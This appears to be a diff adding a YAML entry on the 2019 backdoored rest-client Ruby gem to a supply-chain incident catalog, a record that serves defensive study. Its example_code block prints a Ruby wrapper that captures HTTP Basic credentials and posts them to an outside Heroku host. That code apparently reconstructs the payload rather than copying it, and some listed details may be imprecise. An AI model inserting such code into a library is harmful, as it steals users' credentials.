@@ -1,0 +1,61 @@
+- name: rest-client
+  title: rest-client RubyGems backdoored
+  start_date: 2019-08-13
+  end_date: 2019-08-19
+  license: MIT
+  website: https://github.com/rest-client/rest-client
+  repo: https://github.com/rest-client/rest-client
+  attribution_type: unknown
+  component_type: Library
+  lang: Ruby
+  cause: compromise
+  motive: credential theft
+  attack_vector: credentials compromise
+  insertion_phase: distribution
+  impact_type: credential theft
+  impact_user_count: 1000
+  references:
+    - https://github.com/rest-client/rest-client/issues/713
+    - https://blog.reversinglabs.com/blog/mining-for-malicious-ruby-gems
+  versions:
+    - 1.6.14
+    - 1.6.13
+    - 1.6.12
+    - 1.6.11
+    - 1.6.10
+    - 1.6.9
+    - 1.6.8
+    - 1.6.7
+    - 1.6.6
+    - 1.6.5
+    - 1.6.4
+    - 1.6.3
+    - 1.6.2
+    - 1.6.1
+    - 1.6.0
+  synopsis: Malicious versions of the rest-client gem were published to RubyGems with credential-stealing functionality. The backdoored versions would capture and exfiltrate credentials from HTTP basic authentication.
+  compromise_desc: Unknown attackers gained access to publishing credentials for the rest-client gem and published malicious versions to RubyGems. The attackers added code to capture and exfiltrate HTTP basic authentication credentials to a remote server. The legitimate repository on GitHub remained uncompromised.
+  impact_desc: The compromised gem versions would collect HTTP basic authentication credentials from applications using the library and send them to a server in Ukraine. The malicious versions were downloaded approximately 1,000 times before being removed from RubyGems.
+  example_code: |
+    module RestClient
+      @@captured = false
+      def self.execute(args)
+        # capture credentials only once
+        unless @@captured
+          begin
+            uri = URI.parse("http://east-pip.herokuapp.com/")
+            header = {"Authorization" => args[:headers][:Authorization]} rescue nil
+            if header && header["Authorization"].to_s =~ /^Basic/
+              request = Net::HTTP::Post.new(uri.request_uri)
+              request.body = args.to_json
+              request["Authorization"] = header["Authorization"] rescue nil
+              response = Net::HTTP.start(uri.host, uri.port) {|http| http.request(request)}
+              @@captured = true
+            end
+          rescue
+          end
+        end
+        # original execution
+        Request.execute args
+      end
+    end
